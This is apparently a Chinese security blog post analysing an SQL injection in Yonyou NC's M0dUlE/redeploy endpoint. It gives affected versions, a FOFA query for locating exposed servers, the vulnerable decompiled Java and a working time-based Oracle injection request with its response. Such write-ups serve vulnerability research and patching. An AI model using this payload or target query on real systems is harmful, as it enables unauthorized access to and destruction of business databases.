---
title: "用友NC M0dUlE/redeploy SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html
asset_dir: assets/用友nc-m0duleredeploy-sql注入漏洞
---

# 用友NC M0dUlE/redeploy SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/9 18:04
* 1258浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

数据库管理系统

Server

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统可利用redeploy传入的参数实现SQL注入，可窃取服务器敏感信息。

SQL注入防护

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据官网漏洞通告，可知[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)点为redeploy，通过搜索 redeploy 方法的定义即可找到所在文件

深入探索

安全研究工具

漏洞扫描服务

物流软件安全

[![用友NC M0dUlE/redeploy SQL注入漏洞](images/img-001-40b64adda690.webp)](https://image.mrxn.net/aa740db2f53f4220822631a53e25329a.webp)

nc/uap/portal/action/PortalModuleManagerAction.class 文件

代码安全审计

```
package nc.uap.portal.action;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.common.RuntimeEnv;
import nc.uap.lfw.core.cache.ServiceCacheManger;
import nc.uap.lfw.core.crud.CRUDHelper;
import nc.uap.lfw.core.data.PaginationInfo;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Param;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.deploy.PortalDeployer;
import nc.uap.portal.deploy.vo.PortalDeployDefinition;
import nc.uap.portal.log.PortalLogger;
import nc.uap.portal.service.PortalServiceUtil;
import nc.uap.portal.service.itf.IPortalDeployService;
import nc.uap.portal.util.ToolKit;
import nc.uap.portal.util.freemarker.FreeMarkerTools;
import nc.uap.portal.vo.PtModuleVO;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.io.FileUtils;

@Servlet(
    path = "/M0dUlE"
)
public class PortalModuleManagerAction extends BaseAction {
    public PortalModuleManagerAction() {
    }

@Action
public void redeploy(@Param(name = "id") String id) {
    if (!this.doCrc(id)) {
        this.print("CRC ERROR");
    }

    try {
        CRUDHelper.getCRUDService().executeUpdate("delete from pt_portlet where module = '" + id + "'");
        CRUDHelper.getCRUDService().executeUpdate("delete from pt_portalpage where module = '" + id + "'");
        CRUDHelper.getCRUDService().executeUpdate("DELETE FROM pt_preference WHERE portletname LIKE '" + id + ":%' OR pagename LIKE  '" + id + ":%' ");
    } catch (Exception e) {
        PortalLogger.error(e.getMessage(), e);
    }

    String portalModuleDir = RuntimeEnv.getInstance().getNCHome() + "/portalhome";
    File dir = new File(portalModuleDir + "/" + id);
    if (dir.exists()) {
        PortalDeployDefinition module = PortalServiceUtil.getPortalSpecService().parseModule(dir.getAbsolutePath());
        IPortalDeployService pds = (IPortalDeployService)NCLocator.getInstance().lookup(IPortalDeployService.class);
        pds.deployModule(module);
        ServiceCacheManger.notify("_portlets_cache", "group_portlets_cache");
    }

    this.print("redeploy : ok!");
}
```

虽然 `if (!this.doCrc(id)) {`有判断，但是仅仅打印错误，并没有终止进程，导致进入下一个逻辑后 `id` 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，还是这么朴实无华！

漏洞修复方案

# 漏洞复现

```
GET /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)--&pageId=login HTTP/1.1
Host: nc65.mrxn.net

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=xx.server; Path=/portal/; HttpOnly
X-UA-Compatible: IE=8,9,10
Content-Type: text/html; charset=UTF-8
Date: Thu, 10 Jan 2024 11:42:31 GMT
Content-Length: 23

CRC ERRORredeploy : ok!
```

[![用友NC M0dUlE/redeploy SQL注入漏洞](images/img-002-8d8a05203bcd.webp)](https://image.mrxn.net/5b16a94dba62402199a59916a6e1b353.webp)

Payload 成功延时3倍，延时6秒。

计算机服务器

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=636`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC M0dUlE/redeploy SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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